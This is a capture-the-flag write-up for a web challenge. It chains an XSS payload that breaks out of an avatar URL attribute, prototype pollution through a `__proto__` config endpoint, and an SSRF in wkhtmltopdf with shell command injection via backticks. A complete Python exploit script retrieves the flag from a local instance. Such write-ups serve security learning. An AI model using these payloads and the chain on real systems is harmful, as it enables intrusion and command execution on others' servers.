---
ai_date: 2025-04-27 05:26:08
ai_summary: XSS vulnerability via `safe` filter bypass, also prototype pollution allowing SSRF exploitation through PDF generation
ai_tags:
  - xss
  - prototype-pollution
  - ssrf
created: 2025-03-02T05:54
points: 600
solves: 6
updated: 2025-07-14T09:46
---

`| safe` bypasses safety checks, this is definitely a XSS attack vector.

```html
<div class="box-left">
	{{ userAvatarUrl | renderUrlAsAvatar | safe }}
</div>
```

After looking a bit, my `userAvatarUrl` has to pass the url check.

```js
function isValidHttpUrl(url) {
    if (typeof url !== "string") return false;
    try {
        const parsedUrl = new URL(url);
        return parsedUrl.protocol === "http:" || parsedUrl.protocol === "https:";
    } catch (e) {
        return false;
    }
}
```

Well we can simply bypass it with this.

```
http://qwd.w?<img onerror='alert(1)' src=0>
```

But wait, the image itself is again generated from somewhere else.

```js
userData.getAvatarUrl = async function () {
	// Lazy loading pattern
	if (typeof this.avatarUrl == 'undefined') {
		// Trick: checking if the Github handle is valid by verifying the existence of a profile pic
		let isValidGithubHandle;
		try {
			const githubProfilePicUrl = `https://github.com/${this.github}.png`;
			isValidGithubHandle = (await axios.get(githubProfilePicUrl, {maxRedirects: 2})).status === 200;
		} catch {
			isValidGithubHandle = false;
		}
		this.avatarUrl = isValidGithubHandle ? `https://github.com/${this.github}.png` : 'undefined';
	}
	return this.avatarUrl;
};
```

Some minor changes should make it still work.

```
http://github.com/ octo-kumo.png?<img onerror='alert(1)' src=0> .png
```

Oh wait! There's another filter!

```js
function isLikelyValidGitHubHandle(username) {
    if (typeof username !== "string") return false;
    const regex = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,37}[a-zA-Z0-9])?$/;
    return regex.test(username);
}
```
## prototype pollution
Wait... there's prototype pollution?

```js
app.post('/set-config', [
	body('config')
		.trim()
		.isString()
		.notEmpty()
		.withMessage('Config must be a non-empty string.'),
	body('key')
		.trim()
		.isString()
		.notEmpty()
		.withMessage('Config must be a non-empty string.'),
	body('val')
		.trim()
		.isString()
		.notEmpty()
		.withMessage('Config must be a non-empty string.'),
],
async (req, res) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({errors: errors.array()});
	}
	const cfg = req.body.config;
	if (cfg in config) {
		const key = req.body.key;
		const val = req.body.val;
		config[cfg][key] = val;
		res.json({message: `Mode set to ${val}`});
	} else {
		return res.status(400).json({errors: [`Invalid configuration ${val}`]});
	}
});
```

Wait... prototype pollution can bypass the hard regex filters!

```js
userData.getAvatarUrl = async function () {
	// Lazy loading pattern
	if (typeof this.avatarUrl == 'undefined') {
		// Trick: checking if the Github handle is valid by verifying the existence of a profile pic
		let isValidGithubHandle;
		try {
			const githubProfilePicUrl = `https://github.com/${this.github}.png`;
			isValidGithubHandle = (await axios.get(githubProfilePicUrl, { maxRedirects: 2 })).status === 200;
		} catch {
			isValidGithubHandle = false;
		}
		this.avatarUrl = isValidGithubHandle ? `https://github.com/${this.github}.png` : 'undefined';
	}
	return this.avatarUrl;
};
```

Now we just need a payload here.

```js
function renderUrlAsAvatar(url) {
    const imgUrl = isValidHttpUrl(url) ? url : `https://i.pravatar.cc/400?u=${Math.floor(Math.random() * 1000) + 1}`;
    return `<div style="border-radius: 50%;overflow: hidden;width: 100%;"><img src="${imgUrl}" style="width: 100%; height: 100%; object-fit: cover;"/></div>`
}
```

This should work pretty well.

```
"http://w.w?\" onerror=\"alert(1)"
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1740915439/2025/03/4398a7878da7e227f57d0b8eca92489d.png)

It worked!

So we have XSS, now what?

## PDF SSRF

Turns out **wkhtmltopdf:0.12.6** has a 9.8 vuln [NVD - CVE-2022-35583](https://nvd.nist.gov/vuln/detail/CVE-2022-35583).

I couldn't find PoCs on it, but I think the gist of it is to use iframes.

If we get a SSRF from `/make-card-pdf` back onto `/make-card-pdf` but with malicious inputs, we have free shell.

There is no validation on `/make-card-pdf`.

A naïve solution is complete.

```python
print(prototype('avatarUrl', 'http://yun.ng?"><iframe src="http://127.0.0.1:1984/make-card-pdf?data=\'`ls`\' ce79f83f719f29dab8dd7818048fc99a"></iframe>'))
```

But it doesn't work.

```
Error: Failed to load http://127.0.0.1:1984/make-card-pdf?data='%60ls%60' ce79f83f719f29dab8dd7818048fc99a, with network status code 204 and http status code 401 - Host requires authentication
```

Turns out I had to escape the space.

But after a lot of experimenting I couldn't get the output of the command to display in the pdf.

So I decided to just overwrite (or not) a previous PDF with the output of `/usr/bin/echo-flag`

```python
prototype('avatarUrl', 'http://yun.ng?innocent')
cardId1 = makeCard()
print("target cardId:", cardId1)
cardId = makeCard()
prototype('avatarUrl', 'http://yun.ng?"><iframe src="http://localhost:1984/make-card-pdf?data=\'`/usr/bin/echo-flag>/home/chall/storage/'+cardId1+'.pdf`\'%20'+cardId+'" width="600" height="500"></iframe><!--')
cardId = makeCard()
print("Card ID:", cardId)
downloadCard(cardId)

flag = requests.get(target + '/download-card?email=ww@ww.com&cardId='+cardId1).text
print(flag)
```

```flag
ATHACKCTF{Spacele$$_$$urfing_On_Polluted_$hells}
```


```python
import re
import requests

target = 'http://localhost:14569/'

# target = 'http://localhost:2025/'


def prototype(key, val):
    return requests.post(target + '/set-config', data={
        'config': '__proto__',
        'key': key,
        'val': val
    }).text


def makeCard():
    text = requests.post(target + '/create-card', data={
        'firstName': 'yun',
        'lastName': 'yun',
        'email': 'yun@yun.ng',
        'github': 'octo-kumo',
        'company': 'Yun'
    }).text
    return re.search(r'cardId" value="([0-9a-f]+)', text).group(1)


def downloadCard(cardId):
    return requests.get(target + '/download-card', params={
        "cardId": cardId,
        "email": "yun@yun.ng"
    }).content


prototype('avatarUrl', 'http://yun.ng?innocent')
cardId1 = makeCard()
print("target cardId:", cardId1)
cardId = makeCard()
prototype('avatarUrl', 'http://yun.ng?"><iframe src="http://localhost:1984/make-card-pdf?data=\'`/usr/bin/echo-flag>/home/chall/storage/'+cardId1+'.pdf`\'%20'+cardId+'" width="600" height="500"></iframe><!--')
cardId = makeCard()
print("Card ID:", cardId)
downloadCard(cardId)

flag = requests.get(target + '/download-card?email=ww@ww.com&cardId='+cardId1).text
print(flag)
```